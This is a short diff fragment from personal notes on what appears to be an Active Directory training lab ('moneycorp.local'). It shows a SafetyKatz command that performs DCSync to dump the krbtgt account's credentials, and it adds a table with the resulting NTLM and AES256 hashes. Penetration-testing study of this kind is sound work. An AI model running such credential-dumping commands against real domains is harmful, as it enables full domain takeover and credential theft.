@@ -676,3 +676,13 @@ And use safetykatz to dcsync and dump the hash
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
 ```
 ![[Pasted image 20231025170101.png]]
+`krbtgt - moneycorp.local`
+
+| Type        | Hash                                                             |
+| ----------- | ---------------------------------------------------------------- |
+| Password    | null                                      |
+| NTLM | a0981492d5dfab1ae0b97b51ea895ddf |
+| aes256_hmac | 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e |
+
+
+
